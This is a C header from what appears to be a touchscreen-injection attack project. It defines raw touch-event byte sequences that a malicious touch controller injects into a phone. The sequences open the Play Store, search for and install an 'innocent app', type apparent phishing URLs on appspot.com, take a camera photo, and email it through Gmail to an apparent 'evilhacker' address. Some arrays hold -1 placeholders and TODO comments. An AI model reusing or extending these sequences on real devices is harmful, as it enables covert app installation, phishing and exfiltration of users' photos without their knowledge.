#ifndef _ARRAY_OF_INJECTIONS_H_
#define _ARRAY_OF_INJECTIONS_H_

#include "sniff.h"
#include "touch_injection_macros.h"

// ------------------------------ 0x6 & 0xc registers packets ---------------------------
static const uint8_t stop_signal[] = { 0x00, 0x00};

static const uint8_t reg_0x6[] = { 0x00, 0x02, 0x00, 0x04};
static const uint8_t reg_0xc[] = { 0x00, 0x02, 0x01, 0x00};
static const uint8_t reg_0xc_tentouches[] = { 0x00, 0x02, 0xff, 0x03};
static const uint8_t reg_0xc_fourtouches[] = { 0x00, 0x02, 0x0f, 0x00};
static const uint8_t reg_0xc_fivetouches[] = { 0x00, 0x02, 0x1f, 0x00};
static const uint8_t reg_0xc_finish[] = { 0x00, 0x02, 0x00, 0x00};
static const uint8_t TouchEND_ten[] = { NORAML_DELAY, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t TouchEND_four[] = { NORAML_DELAY, 0x20,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t TouchEND_five[] = { NORAML_DELAY, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static const uint8_t Delay_Touch[] = { NORAML_DELAY, 0x08, 0x01, 0x9d, 0x05, 0xfd, 0x09, 0x30, 0x06, 0x06};

// -------------------------------------------- SwipeUp ---------------------------------
static const uint8_t SwipeUp_0[] = { NORAML_DELAY, 0x08, 0x01, 0xC8, 0x00, 0x50, 0x07, 0x4b, 0x06, 0x06};
static const uint8_t SwipeUp_1[] = { NORAML_DELAY, 0x08, 0x01, 0xC8, 0x00, 0x57, 0x04, 0x4b, 0x06, 0x06};
static const uint8_t SwipeUp_2[] = { NORAML_DELAY, 0x08, 0x01, 0xC8, 0x00, 0x2a, 0x03, 0x4b, 0x06, 0x06};
static const uint8_t SwipeUp_3[] = { NORAML_DELAY, 0x08, 0x01, 0xC8, 0x00, 0xc2, 0x01, 0x4b, 0x06, 0x06};
static const uint8_t SwipeUp_4[] = { NORAML_DELAY, 0x08, 0x01, 0xC8, 0x00, 0x00, 0x01, 0x4b, 0x06, 0x06};
static const uint8_t SwipeUp_5[] = { NORAML_DELAY, 0x08, 0x01, 0xC8, 0x00, 0x40, 0x00, 0x4b, 0x06, 0x06};
static const uint8_t TouchEND_SWIPE[] = { END_SWIPE_DELAY, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
// -------------------------------------------------------------------------------------
// -------------------------------------------- PressHome ------------------------------
static const uint8_t PressHome[] = { NORAML_DELAY, 0x08, 0x01, 0xC7, 0x02, 0xac, 0x09, 0x4b, 0x06, 0x06};
static const uint8_t TouchEND[] = { NORAML_DELAY, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
// -------------------------------------------------------------------------------------
// -------------------------------------------- PressMenu ------------------------------
static const uint8_t PressMenu[] = { NORAML_DELAY, 0x08, 0x01, 0xDC, 0x02, 0xbe, 0x08, 0x4b, 0x06, 0x06};
static const uint8_t TouchEND_GUI[] = { GUI_DELAY, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
// -------------------------------------------------------------------------------------
// -------------------------------------------- PressSearch ----------------------------
static const uint8_t PressSearch[] = { NORAML_DELAY, 0x08, 0x01, 0x75, 0x02, 0xe3, 0x00, 0x4b, 0x06, 0x06};
// TouchEND!
// -------------------------------------------------------------------------------------
// -------------------------------------------- WritePlayStore --------------------------
static const uint8_t PressPLAYsSTORE[] = { NORAML_DELAY, 0x50, 0x01, 0x5f, 0x05, 0x6c, 0x06, 0x37, 0x06, 0x05, 0x01, 0x23, 0x05, 0x28, 0x07, 0x3f, 0x06, 0x06,  0x01, 0xa2, 0x00, 0x60, 0x07, 0x38, 0x06, 0x06,0x01, 0x32, 0x03, 0x73, 0x06, 0x3e, 0x06, 0x06,0x01, 0x01, 0x03, 0xf3, 0x08, 0x48, 0x06, 0x06,0x01, 0x3c, 0x01, 0x5e, 0x07, 0x44, 0x06, 0x06, 0x01, 0xac, 0x02, 0x5f, 0x06, 0x45, 0x06, 0x06, 0x01, 0xed, 0x04, 0x6b, 0x06, 0x3a, 0x06, 0x05, 0x01, 0xf1, 0x01, 0x67, 0x06, 0x45, 0x06, 0x06, 0x01, 0x66, 0x01, 0x6f, 0x06, 0x33, 0x07, 0x07};


static const uint8_t PressP[] = { NORAML_DELAY, 0x08, 0x01, 0x5f, 0x05, 0x6c, 0x06, 0x37, 0x06, 0x05};
// TouchEND!
static const uint8_t PressL[] = { NORAML_DELAY, 0x08, 0x01, 0x23, 0x05, 0x28, 0x07, 0x3f, 0x06, 0x06};
// TouchEND!
static const uint8_t PressA[] = { NORAML_DELAY, 0x08, 0x01, 0xa2, 0x00, 0x60, 0x07, 0x38, 0x06, 0x06};
// TouchEND!
static const uint8_t PressY[] = { NORAML_DELAY, 0x08, 0x01, 0x32, 0x03, 0x73, 0x06, 0x3e, 0x06, 0x06};
// TouchEND!
static const uint8_t PressSpace[] = { NORAML_DELAY, 0x08, 0x01, 0x01, 0x03, 0xf3, 0x08, 0x48, 0x06, 0x06};
// TouchEND!
static const uint8_t PressS[] = { NORAML_DELAY, 0x08, 0x01, 0x3c, 0x01, 0x5e, 0x07, 0x44, 0x06, 0x06};
// TouchEND!
static const uint8_t PressT[] = { NORAML_DELAY, 0x08, 0x01, 0xac, 0x02, 0x5f, 0x06, 0x45, 0x06, 0x06};
// TouchEND!
static const uint8_t PressO[] = { NORAML_DELAY, 0x08, 0x01, 0xed, 0x04, 0x6b, 0x06, 0x3a, 0x06, 0x05};
// TouchEND!
static const uint8_t PressR[] = { NORAML_DELAY, 0x08, 0x01, 0xf1, 0x01, 0x67, 0x06, 0x45, 0x06, 0x06};
// TouchEND!
static const uint8_t PressE[] = { NORAML_DELAY, 0x08, 0x01, 0x66, 0x01, 0x6f, 0x06, 0x33, 0x07, 0x07};
// TouchEND!
// --------------------------------------------------------------------------------------
// -------------------------------------------- PressEnter ------------------------------
static const uint8_t PressEnter[] = { NORAML_DELAY, 0x08, 0x01, 0x42, 0x05, 0xe2, 0x08, 0x31, 0x06, 0x06};
// TouchEND!
// -------------------------------------------------------------------------------------
// -------------------------------------------- PressPlayStore ------------------------------
static const uint8_t PressMenuFirstOption[] = { NORAML_DELAY, 0x08, 0x01, 0xab, 0x00, 0x03, 0x02, 0x43, 0x06, 0x06};
static const uint8_t TouchEND_INTERNET[] = { INTERNET_PLAYSTORE_LOADING_DELAY, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
// -------------------------------------------------------------------------------------
// -------------------------------------------- PressPlayStoreSearch ------------------------------
static const uint8_t PressPlayStoreSearch[] = { NORAML_DELAY, 0x08, 0x01, 0x3e, 0x04, 0xb1, 0x00, 0x4d, 0x06, 0x07};
// TouchEND!
// -------------------------------------------------------------------------------------
// -------------------------------------------- WriteInnocentApp --------------------------
static const uint8_t PressINNOCENTAP[] = { NORAML_DELAY, 0x50, 0x01, 0x27, 0x04, 0x6a, 0x06, 0x3c, 0x05, 0x05, 0x01, 0xd0, 0x03, 0x32, 0x08, 0x3c, 0x06, 0x07, 0x01, 0xdf, 0x03, 0x32, 0x08, 0x3c, 0x06, 0x07,  0x01, 0xed, 0x04, 0x6b, 0x06, 0x3a, 0x06, 0x05, 0x01, 0x21, 0x02, 0x3c, 0x08, 0x46, 0x06, 0x06, 0x01, 0x66, 0x01, 0x6f, 0x06, 0x33, 0x07, 0x07, 0x01, 0xdf, 0x03, 0x3A, 0x08, 0x3c, 0x06, 0x07, 0x01, 0xac, 0x02, 0x5f, 0x06, 0x45, 0x06, 0x06, 0x01, 0xa2, 0x00, 0x60, 0x07, 0x38, 0x06, 0x06 , 0x01, 0x50, 0x05, 0x6c, 0x06, 0x37, 0x06, 0x05};
static const uint8_t PressI[] = { NORAML_DELAY, 0x08, 0x01, 0x27, 0x04, 0x6a, 0x06, 0x3c, 0x05, 0x05};
// TouchEND!
static const uint8_t PressN[] = { NORAML_DELAY, 0x08, 0x01, 0xdf, 0x03, 0x32, 0x08, 0x3c, 0x06, 0x07};
// TouchEND!
// PressN
// TouchEND!
// PressO
// TouchEND!
static const uint8_t PressC[] = { NORAML_DELAY, 0x08, 0x01, 0x21, 0x02, 0x3c, 0x08, 0x46, 0x06, 0x06};
// TouchEND!
// PressE
// TouchEND!
// PressN
// TouchEND!
// PressT
// TouchEND!
// PressSpace
// TouchEND!
// PressA
// TouchEND!
// PressP
// TouchEND!
// PressP
// TouchEND!
// --------------------------------------------------------------------------------------
// -------------------------------------------- PressPlayStoreFirstOption ------------------------------
static const uint8_t PressPlayStoreFirstOption[] = { NORAML_DELAY, 0x08, 0x01, 0xcb, 0x00, 0x72, 0x02, 0x43, 0x06, 0x06};
// TouchEND!
// -------------------------------------------------------------------------------------
// -------------------------------------------- PressInstall ------------------------------
static const uint8_t PressInstall[] = { NORAML_DELAY, 0x08, 0x01, 0x69, 0x04, 0x5b, 0x04, 0x43, 0x06, 0x06};
static const uint8_t TouchEND_DOWNLOAD[] = { DOWNLOADING_DELAY, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
// -------------------------------------------------------------------------------------
// -------------------------------------------- PressAcceptInstall ------------------------------
static const uint8_t PressAcceptInstall[] = { NORAML_DELAY, 0x08, 0x01, 0x5a, 0x04, 0x33, 0x06, 0x43, 0x06, 0x06};
// TouchEND!
// -------------------------------------------------------------------------------------
// -------------------------------------------- PressOpenInsalled ------------------------------
static const uint8_t PressOpenInsalled[] = { NORAML_DELAY, 0x08, 0x01, 0x5a, 0x04, 0x75, 0x04, 0x43, 0x06, 0x06};
// TouchEND!
// -------------------------------------------------------------------------------------/


/* TODO : adding missing values (-1) */
/* Check for the makaf thing  */


static const uint8_t Press__DOT_smashphis[] = {NORAML_DELAY , 80 , 1 , 95 , 4 , 36 , 9 , 55 , 6 , 5 , 1 , 60 , 1 , 94 , 7 , 68 , 6 , 6 , 1 , 145 , 4 , 31 , 8 , 75 , 7 , 6 , 1 , 162 , 0 , 96 , 7 , 56 , 6 , 6 , 1 , 60 , 1 , 94 , 7 , 68 , 6 , 6 , 1 , 107 , 3 , 72 , 7 , 63 , 6 , 6 , 1 , 95 , 5 , 108 , 6 , 55 , 6 , 5 , 1 , 107 , 3 , 72 , 7 , 63 , 6 , 6 , 1 , 31 , 4 , 130 , 6 , 69 , 6 , 6 , 1 , 60 , 1 , 94 , 7 , 68 , 6 , 6};

static const uint8_t Press_h_DOT_appspot_DOT_[] = {NORAML_DELAY , 80 , 1 , 107 , 3 , 72 , 7 , 63 , 6 , 6 , 1 , 95 , 4 , 36 , 9 , 55 , 6 , 5 , 1 , 162 , 0 , 96 , 7 , 56 , 6 , 6 , 1 , 95 , 5 , 108 , 6 , 55 , 6 , 5 , 1 , 95 , 5 , 108 , 6 , 55 , 6 , 5 , 1 , 60 , 1 , 94 , 7 , 68 , 6 , 6 , 1 , 95 , 5 , 108 , 6 , 55 , 6 , 5 , 1 , 237 , 4 , 107 , 6 , 58 , 6 , 5 , 1 , 172 , 2 , 95 , 6 , 69 , 6 , 6 , 1 , 95 , 4 , 36 , 9 , 55 , 6 , 5};

static const uint8_t Press_com_SLASH_[] = {NORAML_DELAY , 32 , 1 , 33 , 2 , 60 , 8 , 70 , 6 , 6 , 1 , 237 , 4 , 107 , 6 , 58 , 6 , 5 , 1 , 145 , 4 , 31 , 8 , 75 , 7 , 6 , 1 , 44 , 1 , 206 , 8 , 65 , 6 , 7};


static const uint8_t Press__DOT_oynero_MAKAF_hr[] = {NORAML_DELAY , 80 , 1 , 95 , 4 , 36 , 9 , 55 , 6 , 5 , 1 , 237 , 4 , 107 , 6 , 58 , 6 , 5 , 1 , 50 , 3 , 115 , 6 , 62 , 6 , 6 , 1 , 223 , 3 , 50 , 8 , 60 , 6 , 7 , 1 , 102 , 1 , 111 , 6 , 51 , 7 , 7 , 1 , 241 , 1 , 103 , 6 , 69 , 6 , 6 , 1 , 237 , 4 , 107 , 6 , 58 , 6 , 5 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , 107 , 3 , 72 , 7 , 63 , 6 , 6 , 1 , 241 , 1 , 103 , 6 , 69 , 6 , 6};

static const uint8_t Press_d_DOT_appspot_DOT_[] = {NORAML_DELAY , 80 , 1 , 183 , 1 , 52 , 7 , 54 , 6 , 7 , 1 , 95 , 4 , 36 , 9 , 55 , 6 , 5 , 1 , 162 , 0 , 96 , 7 , 56 , 6 , 6 , 1 , 95 , 5 , 108 , 6 , 55 , 6 , 5 , 1 , 95 , 5 , 108 , 6 , 55 , 6 , 5 , 1 , 60 , 1 , 94 , 7 , 68 , 6 , 6 , 1 , 95 , 5 , 108 , 6 , 55 , 6 , 5 , 1 , 237 , 4 , 107 , 6 , 58 , 6 , 5 , 1 , 172 , 2 , 95 , 6 , 69 , 6 , 6 , 1 , 95 , 4 , 36 , 9 , 55 , 6 , 5};

static const uint8_t Press_com_SLASH_smashp[] = {NORAML_DELAY , 80 , 1 , 33 , 2 , 60 , 8 , 70 , 6 , 6 , 1 , 237 , 4 , 107 , 6 , 58 , 6 , 5 , 1 , 145 , 4 , 31 , 8 , 75 , 7 , 6 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , 60 , 1 , 94 , 7 , 68 , 6 , 6 , 1 , 145 , 4 , 31 , 8 , 75 , 7 , 6 , 1 , 162 , 0 , 96 , 7 , 56 , 6 , 6 , 1 , 60 , 1 , 94 , 7 , 68 , 6 , 6 , 1 , 107 , 3 , 72 , 7 , 63 , 6 , 6 , 1 , 95 , 5 , 108 , 6 , 55 , 6 , 5};

static const uint8_t Press_hish_SLASH_[] = {NORAML_DELAY , 40 , 1 , 107 , 3 , 72 , 7 , 63 , 6 , 6 , 1 , 31 , 4 , 130 , 6 , 69 , 6 , 6 , 1 , 60 , 1 , 94 , 7 , 68 , 6 , 6 , 1 , 107 , 3 , 72 , 7 , 63 , 6 , 6 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1};


static const uint8_t Press_p_SPACE_omer[] = {NORAML_DELAY , 48 , 1 , 95 , 5 , 108 , 6 , 55 , 6 , 5 , 1 , 1 , 3 , 243 , 8 , 72 , 6 , 6 , 1 , 237 , 4 , 107 , 6 , 58 , 6 , 5 , 1 , 145 , 4 , 31 , 8 , 75 , 7 , 6 , 1 , 102 , 1 , 111 , 6 , 51 , 7 , 7 , 1 , 241 , 1 , 103 , 6 , 69 , 6 , 6};


static const uint8_t Press_evilscreen[] ={NORAML_DELAY , 80 , 1 , 102 , 1 , 111 , 6 , 51 , 7 , 7 , 1 , 214 , 2 , 27 , 8 , 62 , 6 , 6 , 1 , 31 , 4 , 130 , 6 , 69 , 6 , 6 , 1 , 35 , 5 , 40 , 7 , 63 , 6 , 6 , 1 , 60 , 1 , 94 , 7 , 68 , 6 , 6 , 1 , 33 , 2 , 60 , 8 , 70 , 6 , 6 , 1 , 241 , 1 , 103 , 6 , 69 , 6 , 6 , 1 , 102 , 1 , 111 , 6 , 51 , 7 , 7 , 1 , 102 , 1 , 111 , 6 , 51 , 7 , 7 , 1 , 223 , 3 , 50 , 8 , 60 , 6 , 7};


static const uint8_t Press_camera[] = {NORAML_DELAY , 48 , 1 , 33 , 2 , 60 , 8 , 70 , 6 , 6 , 1 , 162 , 0 , 96 , 7 , 56 , 6 , 6 , 1 , 145 , 4 , 31 , 8 , 75 , 7 , 6 , 1 , 102 , 1 , 111 , 6 , 51 , 7 , 7 , 1 , 241 , 1 , 103 , 6 , 69 , 6 , 6 , 1 , 162 , 0 , 96 , 7 , 56 , 6 , 6};

static const uint8_t TouchEND_eight[] = {NORAML_DELAY,  64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t TouchEND_six[] = {NORAML_DELAY,  48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};


static const uint8_t reg_0xc_eighttouches[] = { 0x00, 0x02, 0xff, 0x00};
static const uint8_t reg_0xc_sixtouches[] = { 0x00, 0x02, 0x3f, 0x00};

static const uint8_t say_cheese[] = {NORAML_DELAY, 0x08,  0x01, 0xd8, 0x02, 0x8d, 0x08, 0x42, 0x06, 0x07 };

static const uint8_t share[] = {NORAML_DELAY, 0x08,  0x01, 0x9c, 0x01, 0xd6, 0x08, 0x43, 0x06, 0x07};
static const uint8_t share_Gmail[] = {NORAML_DELAY , 0x08 , 0x01, 0xf5, 0x00, 0x2c, 0x06, 0x45, 0x07, 0x07 };

static const uint8_t  Press_evilhacker[] = {NORAML_DELAY , 80 , 1 , 102 , 1 , 111 , 6 , 51 , 7 , 7 , 1 , 214 , 2 , 27 , 8 , 62 , 6 , 6 , 1 , 31 , 4 , 130 , 6 , 69 , 6 , 6 , 1 , 35 , 5 , 40 , 7 , 63 , 6 , 6 , 1 , 107 , 3 , 72 , 7 , 63 , 6 , 6 , 1 , 162 , 0 , 96 , 7 , 56 , 6 , 6 , 1 , 33 , 2 , 60 , 8 , 70 , 6 , 6 , 1 , 122 , 4 , 92 , 7 , 71 , 6 , 6 , 1 , 102 , 1 , 111 , 6 , 51 , 7 , 7 , 1 , 241 , 1 , 103 , 6 , 69 , 6 , 6};

static const uint8_t  Press_zgmail_DOT_com[] = {NORAML_DELAY , 80 ,  0x01, 0x42, 0x01, 0xfc, 0x08, 0x43, 0x06, 0x07  , 1 , 200 , 2 , 55 , 7 , 62 , 6 , 6 , 1 , 145 , 4 , 31 , 8 , 75 , 7 , 6 , 1 , 162 , 0 , 96 , 7 , 56 , 6 , 6 , 1 , 31 , 4 , 130 , 6 , 69 , 6 , 6 , 1 , 35 , 5 , 40 , 7 , 63 , 6 , 6 , 1 , 95 , 4 , 36 , 9 , 55 , 6 , 5 , 1 , 33 , 2 , 60 , 8 , 70 , 6 , 6 , 1 , 237 , 4 , 107 , 6 , 58 , 6 , 5 , 1 , 145 , 4 , 31 , 8 , 75 , 7 , 6};

static const uint8_t send[] = {NORAML_DELAY , 8 , 0x01, 0xd9, 0x04, 0xc5, 0x00, 0x41, 0x06, 0x07};
static const uint8_t change_camera[] = {NORAML_DELAY , 8 , 0x01, 0xfe, 0x00, 0x65, 0x08, 0x42, 0x06, 0x07 };





static const uint8_t array_of_keys[31][9] = {
		{'a', 0x01, 0xa2, 0x00, 0x60, 0x07, 0x38, 0x06, 0x06}, //1
		{'b', 0x01, 0x54, 0x03, 0x18, 0x08, 0x45, 0x06, 0x06}, //2
		{'c', 0x01, 0x21, 0x02, 0x3c, 0x08, 0x46, 0x06, 0x06}, //3
		{'d', 0x01, 0xb7, 0x01, 0x34, 0x07, 0x36, 0x06, 0x07}, //4
		{'e', 0x01, 0x66, 0x01, 0x6f, 0x06, 0x33, 0x07, 0x07}, //5
		{'f', 0x01, 0x4e, 0x02, 0x43, 0x07, 0x40, 0x06, 0x06}, //6
		{'g', 0x01, 0xc8, 0x02, 0x37, 0x07, 0x3e, 0x06, 0x06}, //7
		{'h', 0x01, 0x6b, 0x03, 0x48, 0x07, 0x3f, 0x06, 0x06}, //8
		{'i', 0x01, 0x1f, 0x04, 0x82, 0x06, 0x45, 0x06, 0x06}, //9
		{'j', 0x01, 0xfc, 0x03, 0x5a, 0x07, 0x38, 0x06, 0x06}, //10
		{'k', 0x01, 0x7a, 0x04, 0x5c, 0x07, 0x47, 0x06, 0x06}, //11
		{'l', 0x01, 0x23, 0x05, 0x28, 0x07, 0x3f, 0x06, 0x06}, //12
		{'m', 0x01, 0x91, 0x04, 0x1f, 0x08, 0x4b, 0x07, 0x06}, //13
		{'n', 0x01, 0xdf, 0x03, 0x32, 0x08, 0x3c, 0x06, 0x07}, //14
		{'o' ,0x01, 0xed, 0x04, 0x6b, 0x06, 0x3a, 0x06, 0x05}, //15
		{'p', 0x01, 0x5f, 0x05, 0x6c, 0x06, 0x37, 0x06, 0x05}, //16
		{'q', 0x01, 0x58, 0x00, 0x8e, 0x06, 0x3f, 0x06, 0x06}, //17
		{'r', 0x01, 0xf1, 0x01, 0x67, 0x06, 0x45, 0x06, 0x06}, //18
		{'s', 0x01, 0x3c, 0x01, 0x5e, 0x07, 0x44, 0x06, 0x06}, //19
		{'t', 0x01, 0xac, 0x02, 0x5f, 0x06, 0x45, 0x06, 0x06}, //20
		{'u', 0x01, 0xe9, 0x03, 0x6e, 0x06, 0x4a, 0x07, 0x06}, //21
		{'v', 0x01, 0xd6, 0x02, 0x1b, 0x08, 0x3e, 0x06, 0x06}, //22
		{'w', 0x01, 0xf3, 0x00, 0x7c, 0x06, 0x41, 0x06, 0x06}, //23
		{'x', 0x01, 0xc1, 0x01, 0x22, 0x08, 0x45, 0x06, 0x06}, //24
		{'y', 0x01, 0x32, 0x03, 0x73, 0x06, 0x3e, 0x06, 0x06}, //25
		{'z', 0x01, 0x25, 0x01, 0x26, 0x08, 0x42, 0x06, 0x06}, //26
		{'.', 0x01, 0x5f, 0x04, 0x24, 0x09, 0x37, 0x06, 0x05}, //27
		{' ', 0x01, 0x01, 0x03, 0xf3, 0x08, 0x48, 0x06, 0x06}, //28
		{'/', 0x01, 0x2c, 0x01, 0xce, 0x08, 0x41, 0x06, 0x07 }, //29 /* TODO: adding values here. */
		{'\n', 0x01, 0x13, 0x05, 0xec, 0x08, 0x47, 0x07, 0x07 }, //31
		{'-', -1, -1, -1, -1, -1, -1, -1, -1}, //30

};

#endif





